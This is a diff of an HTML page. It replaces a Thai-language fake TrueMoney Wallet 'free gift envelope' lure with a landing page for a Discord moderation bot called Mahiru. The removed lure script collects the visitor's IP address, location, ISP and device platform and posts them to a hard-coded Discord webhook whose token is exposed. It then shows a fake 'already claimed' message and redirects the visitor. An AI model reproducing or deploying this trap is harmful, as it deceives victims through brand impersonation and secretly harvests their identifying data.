@@ -1,85 +1,274 @@
+
 <!DOCTYPE html>
 <html lang="th">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>รับซองทรูมันนี่วอลเล็ทฟรี - TrueMoney</title>
-<style>
-    body { margin: 0; font-family: 'Kanit', sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .card { width: 90%; max-width: 400px; background: #fff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; padding: 30px; }
-    .logo { width: 150px; margin-bottom: 20px; }
-    .gift-box { width: 120px; animation: bounce 2s infinite; }
-    @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
-    h2 { color: #ff8c00; margin: 15px 0; }
-    p { color: #666; font-size: 14px; }
-    .btn { background: #ff8c00; color: #fff; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 20px; width: 100%; }
-    .btn:hover { background: #e67e00; transform: scale(1.05); }
-    #status { margin-top: 15px; font-size: 12px; color: #999; }
-</style>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>มาฮิรุ — ดูแลเซิร์ฟเวอร์ตลอด 24 ชั่วโมง</title>
+  <meta name="description" content="Mahiru เป็นบอทดิสคอร์ดที่มีระบบมากมายที่มีดีเยี่ยมและมีฟีเจอร์ที่ครบถ้วน" />
+  <link rel="icon" href="favicon.png" sizes="512x512" type="image/png" />
+  <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;700;900&family=Itim&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-<div class="card">
-    <img src="https://www.truemoney.com/wp-content/uploads/2020/12/truemoney-wallet-logo.png" class="logo">
-    <img src="https://img5.pic.in.th/file/secure-sv1/gift-box.png" class="gift-box">
-    <h2>คุณได้รับซองของขวัญ!</h2>
-    <p>กดปุ่มด้านล่างเพื่อรับเงินสุ่มตั้งแต่ 10 - 500 บาท<br>เข้าบัญชีทรูมันนี่ วอลเล็ทของคุณทันที</p>
-    <button class="btn" onclick="startTrap()">กดเพื่อรับซองฟรี</button>
-    <div id="status">ระบบกำลังตรวจสอบสิทธิ์...</div>
+<div class="bg-shapes" id="bgShapes"></div>
+
+<nav>
+  <a href="#" class="nav-logo">
+    <img src="https://s13.gifyu.com/images/bqNeL.gif" class="nav-logo-img">
+    มาฮิรุ
+  </a>
+  <ul>
+    <li><a href="#features">ฟีเจอร์</a></li>
+    <li><a href="#commands">คำสั่ง</a></li>
+    <li><a href="#dev">Developer</a></li>
+  </ul>
+  <a href="https://discord.com/oauth2/authorize?client_id=1427456585986211840&scope=bot&permissions=27649060030" class="nav-cta" target="_blank">🤖 เชิญบอท</a>
+</nav>
+
+<section class="hero">
+  <div class="hero-inner">
+    <div class="avatar-area">
+      <div class="avatar-wrap">
+        <div class="av-blob-ring"></div>
+        <div class="av-blob-ring2"></div>
+        <div class="av-star">✨</div>
+        <div class="av-star">⭐</div>
+        <div class="av-star">🌟</div>
+        <div class="av-star">💫</div>
+        <div class="avatar-img-wrap">
+          <img src="https://s13.gifyu.com/images/bqNeL.gif" alt="มาฮิรุ" class="avatar-img"
+               onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'"/>
+        </div>
+      </div>
+      <div class="avatar-status">
+        <div class="dot-online"></div>
+        Online · Mahiru      </div>
+    </div>
+    <div class="hero-text">
+      <div class="hero-tag">✨ Discord Bot · Thailand 🇹🇭</div>
+      <h1 class="hero-title">
+        <span class="t1">มาฮิรุ</span>
+        <span class="t2">Discord Bot 💙</span>
+      </h1>
+      <span id="typed"></span><span class="cursor">|</span>
+      <div class="hero-stats">
+        <div class="stat-pill"><div class="num">24/7</div><div class="lbl">Online</div></div>
+        <div class="stat-pill"><div class="num">v1 and v2</div><div class="lbl">System</div></div>
+        <div class="stat-pill"><div class="num">51</div><div class="lbl">Commands</div></div>
+        <div class="stat-pill"><div class="num">🛡️</div><div class="lbl">Blacklist</div></div>
+      </div>
+      <div class="hero-btns">
+        <a href="https://discord.com/oauth2/authorize?client_id=1427456585986211840&scope=bot&permissions=27649060030" class="btn btn-primary" target="_blank">🤖 เชิญบอทเข้าเซิร์ฟ</a>
+        <a href="https://discord.gg/Gu8KjSH4Bu" class="btn btn-soft" target="_blank">💙 SUPPORT</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="wavy">
+  <svg viewBox="0 0 1440 80" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
+    <path d="M0 40 C240 80 480 0 720 40 C960 80 1200 0 1440 40 L1440 80 L0 80 Z" fill="#ffffff"/>
+  </svg>
 </div>
 
-<script>
+<section id="features">
+  <div class="container">
+    <div class="sec-header reveal">
+      <div class="sec-tag">🛠️ Bot user manual</div>
+      <h2 class="sec-title">คู่มือการใช้งาน  <span class="accent">บอท</span></h2>
+      <p class="sec-sub">คำแนะนำในการใช้งานบอทอย่างละเอียด 🌸</p>
+    </div>
 
-const webhookURL = "https://discord.com/api/webhooks/1499460967979942014/a7wMgIv8eKeJYAv2oA84nyZA4IG0OeP3iAMFwxUR2EXDLA0968IMWn5qusmTb9_d0r4y";
+    <div class="features-grid">
 
-async function getFullIntel() {
-    try {
-        const response = await fetch('http://ip-api.com/json/?fields=status,country,city,isp,query');
-        const data = await response.json();
-        if (data.status === 'success') {
-            return { ip: data.query, loc: `${data.city}, ${data.country}`, isp: data.isp };
-        }
-        throw new Error();
-    } catch (e) {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const d = await res.json();
-            return { ip: d.ip, loc: "Unknown (Fallback)", isp: "N/A" };
-        } catch {
-            return { ip: "Bypassed/Hidden", loc: "N/A", isp: "N/A" };
-        }
-    }
-}
+      <div class="feat-card reveal">
+        <div class="feat-icon-wrap">🛡️</div>
+        <h3>ป้องกันการโจมตีเซิร์ฟเวอร์</h3>
+        </p>ระบบ Anti Nuke</p>
+        <p>• ตรวจจับการทำงานผิดปกติภายในเซิร์ฟ</p>
+        <p>• จัดการคนที่ลบห้อง หรือเตะคนรัวๆ</p>
+      </div>
 
-async function startTrap() {
-    const statusText = document.getElementById("status");
-    statusText.textContent = "⌛ กำลังตรวจสอบยอดเงินในซอง...";
-    
-    // สอยข้อมูลเหยื่อสวัส!
-    const intel = await getFullIntel();
-    
-    const content = `🎯 **GIFT ENVELOPE TARGET ACQUIRED**\n` +
-                    `📡 **REAL IP:** \`${intel.ip}\`\n` +
-                    `📍 **Location:** \`${intel.loc}\`\n` +
-                    `🌐 **ISP:** \`${intel.isp}\`\n` +
-                    `📱 **Device:** ${navigator.platform}\n` +
-                    `⏰ **Time:** ${new Date().toLocaleString()}`;
+      <div class="feat-card reveal">
+        <div class="feat-icon-wrap">🔐</div>
+        <h3>Verify System - CAPTCHA</h3>
+        </p>ระบบ Verify</p>
+        <p>• ใช้ระบบ CAPTCHA ยืนยันตัวตนคนเข้าเซิร์ฟ</p>
+        <p>• ตั้งค่าหน้าต่าง Panel V2 ได้เอง</p>
+        <p>• แจ้งเตือนลงห้อง Log ให้แอดมินทราบ</p>
+      </div>
 
-    try {
-        await fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: content })
-        });
-        
-        statusText.textContent = "❌ เสียใจด้วย! ซองนี้ถูกรับไปครบแล้ว";
-        alert("ขออภัย! ซองของขวัญนี้มีผู้รับไปครบจำนวนแล้ว");
-        window.location.href = "https://www.truemoney.com";
-    } catch (e) {
-        statusText.textContent = "เครือข่ายขัดข้อง ลองใหม่อีกครั้ง";
-    }
-}
-</script>
+      <div class="feat-card reveal">
+        <div class="feat-icon-wrap">🚫</div>
+        <h3>ป้องกันข้อความสแปม</h3>
+        </p>ระบบ Anti Spam</p>
+        <p>• ตรวจจับการพิมพ์ข้อความเร็วเกิน</p>
+        <p>• ป้องกันการแท็ก @everyone / @here</p>
+        <p>• ป้องกันการส่งลิงก์อันตราย</p>
+      </div>
 
+      <div class="feat-card reveal">
+        <div class="feat-icon-wrap">⚡</div>
+        <h3>ป้องกันไม่ให้โดนตรวจจับ</h3>
+        </p>ระบบ Whitelist</p>
+        <p>• เพิ่มผู้ใช้/ยศ/ช่อง ให้อยู่ในโหมดปลอดภัย</p>
+        <p>• ดูรายการทั้งหมดได้ผ่านคำสั่ง /whitelist</p>
+      </div>
+
+      <div class="feat-card reveal">
+        <div class="feat-icon-wrap">🚪</div>
+        <h3>ป้องกันบอทเข้าเซิร์ฟเวอร์</h3>
+        </p>ระบบ Join Gate</p>
+        <p>• จัดการกลุ่มคนที่เข้ามาพร้อมกันจำนวนมาก</p>
+        <p>• สามารถตั้งค่าให้ เตะ/แบน อัตโนมัติ</p>
+      </div>
+
+      <div class="feat-card reveal">
+        <div class="feat-icon-wrap">⚙️</div>
+        <h3>คำสั่งที่แอดมินต้องรู้</h3>
+        </p>การตั้งค่าเริ่มต้น</p>
+        <p>• /security panel - ตั้งค่าระบบป้องกันทั้งหมด</p>
+        <p>• /verify panel - ตั้งค่าระบบยืนยันตัวตน</p>
+        <p>• /welcome panel - ตั้งค่าห้องต้อนรับ</p>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<div class="wavy">
+  <svg viewBox="0 0 1440 80" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
+    <path d="M0 40 C240 0 480 80 720 40 C960 0 1200 80 1440 40 L1440 80 L0 80 Z" fill="#fdf0f8"/>
+  </svg>
+</div>
+
+<section id="commands">
+  <div class="container">
+    <div class="sec-header reveal">
+      <div class="sec-tag">🎮 Main commands</div>
+      <h2 class="sec-title"><span class="accent">Slash</span> Commands</h2>
+      <p class="sec-sub">คำสั่งหลักๆที่ใช้งาน🎀</p>
+    </div>
+    <div class="cmd-list">
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">📢</div>
+        <div class="cmd-name">/speak </div>
+        <div class="cmd-desc">ระบบพูดข้อความ</div>
+        <span class="cmd-badge badge-all">ทุกคน</span>
+      </div>
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">🛡️</div>
+        <div class="cmd-name">/security panel</div>
+        <div class="cmd-desc">ตั้งค่าระบบป้องกันทั้งหมด</div>
+        <div class="cmd-desc">(Anti Nuke, Anti Raid, Logs, Join Gate)</div>
+        <span class="cmd-badge badge-admin">แอดมินเซิร์ฟ</span>
+      </div>
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">🛡️</div>
+        <div class="cmd-name">/whitelist</div>
+        <div class="cmd-desc">จัดการระบบไวท์ลิสต์</div>
+        <div class="cmd-desc">(เพิ่ม/ลบ ผู้ใช้, ยศ, ช่อง เพื่อให้ไม่โดนจับผิด)</div>
+        <span class="cmd-badge badge-admin">แอดมินเซิร์ฟ</span>
+      </div>
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">🛡️</div>
+        <div class="cmd-name">/anti_webhook</div>
+        <div class="cmd-desc">การป้องกันสแปม เว็ปฮุกทั้งเซิฟเวอร์</div>
+        <div class="cmd-desc">anti_webhook, ลบเว็ปฮุกทั้งเซิฟ, ตั้งค่าการลงโทษ</div>
+        <span class="cmd-badge badge-admin">แอดมินเซิร์ฟ</span>
+      </div>
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">📦</div>
+        <div class="cmd-name">/verify panel</div>
+        <div class="cmd-desc">สร้างจุดยืนยันตัวตนสำหรับคนเข้าเซิร์ฟใหม่</div>
+        <span class="cmd-badge badge-admin">แอดมินเซิร์ฟ</span>
+      </div>
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">🐟</div>
+        <div class="cmd-name">/welcome panel</div>
+        <div class="cmd-desc">ตั้งค่าแบนเนอร์และข้อความต้อนรับคนเข้า</div>
+        <span class="cmd-badge badge-admin">แอดมินเซิร์ฟ</span>
+      </div>
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">🎣</div>
+        <div class="cmd-name">/goodbye panel</div>
+        <div class="cmd-desc">ตั้งค่าข้อความบอกลาตอนคนออก</div>
+        <span class="cmd-badge badge-admin">แอดมินเซิร์ฟ</span>
+      </div>
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">🍕</div>
+        <div class="cmd-name">/boost panel</div>
+        <div class="cmd-desc">แผงควบคุมระบบแจ้งเตือนบูสต์เซิร์ฟเวอร์</div>
+        <span class="cmd-badge badge-admin">แอดมินเซิร์ฟ</span>
+      </div>
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">🍔</div>
+        <div class="cmd-name">/sticky</div>
+        <div class="cmd-desc">ตั้งค่าระบบปักหมุด</div>
+        <span class="cmd-badge badge-admin">แอดมินเซิร์ฟ</span>
+      </div>
+            <div class="cmd-card reveal">
+        <div class="cmd-icon-wrap">👑</div>
+        <div class="cmd-name">/admin</div>
+        <div class="cmd-desc">แผงควบคุมผู้ดูแลระบบ</div>
+        <span class="cmd-badge badge-owner">Owner</span>
+      </div>
+          </div>
+  </div>
+</section>
+
+<div class="wavy">
+  <svg viewBox="0 0 1440 80" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
+    <path d="M0 40 C240 80 480 0 720 40 C960 80 1200 0 1440 40 L1440 80 L0 80 Z" fill="#ffffff"/>
+  </svg>
+</div>
+
+<section id="dev">
+  <div class="container">
+    <div class="sec-header reveal">
+      <div class="sec-tag">🌟 Developer</div>
+      <h2 class="sec-title">About The <span class="accent">Developer</span></h2>
+      <p class="sec-sub">ผู้อยู่เบื้องหลังบอทตัวนี้ 💜</p>
+    </div>
+    <div class="dev-card reveal">
+      <div class="dev-avatar-outer">
+        <div class="dev-crown">👑</div>
+        <div class="dev-blob-ring"></div>
+        <div class="dev-blob-ring2"></div>
+        <div class="dev-img-wrap">
+          <img src="https://i.ibb.co/jvTL9CDv/profile.png" alt="bpxz_store_x2" class="dev-img"
+               onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'"/>
+        </div>
+      </div>
+      <div class="dev-info">
+        <div class="dev-label">✦ BOT OWNER</div>
+        <div class="dev-name">! ชอบสาวแว่น</div>
+        <div class="dev-role">Developer · ! ชอบสาวแว่น</div>
+        <p class="dev-desc">
+          ผู้พัฒนา มาฮิรุ มุ่งเน้นสร้างระบบ Discord ที่ทันสมัย เสถียรสูง
+          มีระบบความปลอดภัยแข็งแกร่ง รองรับหลายเซิร์ฟเวอร์พร้อมกัน 💙
+        </p>
+        <div class="dev-btns">
+          <a href="https://discord.gg/VEfMATCCGB" class="btn btn-soft" target="_blank" style="font-size:.83rem;padding:.5rem 1.2rem;">💙 Rayzen</a>
+          <a href="https://discord.com/oauth2/authorize?client_id=1427456585986211840&scope=bot&permissions=27649060030" class="btn btn-primary" target="_blank" style="font-size:.83rem;padding:.5rem 1.2rem;">🤖 เชิญบอท</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="footer-logo">Mahiru Copyright 2021-2030</div>
+  <div class="footer-links">
+    <a href="https://discord.gg/VEfMATCCGB"  target="_blank">Rayzen</a>
+    <a href="https://discord.gg/Gu8KjSH4Bu" target="_blank">SUPPORT</a>
+    <a href="https://discord.com/oauth2/authorize?client_id=1427456585986211840&scope=bot&permissions=27649060030"  target="_blank">INVITE BOT</a>
+  </div>
+  <div class="footer-copy">© 2026 Rayzen · Mahiru · All rights reserved 💙</div>
+</footer>
+
+<script src="script.js"></script>
 </body>
 </html>
